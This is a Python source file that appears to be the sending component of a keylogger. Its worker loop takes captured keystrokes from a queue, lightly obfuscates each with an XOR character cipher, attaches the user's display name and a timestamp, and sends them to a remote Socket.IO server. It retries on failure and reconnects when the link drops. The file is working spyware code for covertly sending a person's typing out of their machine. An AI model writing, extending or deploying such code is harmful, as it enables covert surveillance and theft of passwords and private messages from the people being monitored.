import time
import logging
from queue import Empty, Queue
from socketio import Client
from agent.client_details import get_display_username
from shared.Encriptor import XorCharCipher


def do_work(sio: Client, keystrokes_queue: Queue, cipher: XorCharCipher, reconnect_interval: int = 5):
    """
    Worker loop that processes keystrokes and sends them via Socket.IO.
    Handles disconnections, queue timeouts, errors, and CPU overuse.
    """
    while True:
        if not sio.connected:
            logging.warning("Socket.IO not connected, retrying...")
            time.sleep(reconnect_interval)
            continue

        try:
            # Try to get a keystroke with timeout to prevent blocking forever
            keystroke = keystrokes_queue.get(timeout=1)

            try:
                encrypted_value = cipher.encrypt_char(keystroke.get("event"))
            except Exception as e:
                logging.error(f"Encryption failed: {e}, event={keystroke}")
                continue  # Skip this keystroke

            payload = {
                'event': encrypted_value,
                'timestamp': keystroke.get('timestamp'),
                'username': get_display_username()
            }

            try:
                sio.emit("ev", payload)
            except Exception as e:
                logging.error(f"Failed to emit event: {e}, saving for retry...")
                # Optional: Push back to queue for retry
                keystrokes_queue.put(keystroke)

        except Empty:
            # No keystroke available, avoid busy waiting
            time.sleep(0.1)

        except Exception as e:
            logging.exception(f"Unexpected error in worker loop: {e}")
            time.sleep(1)  # prevent tight error loop
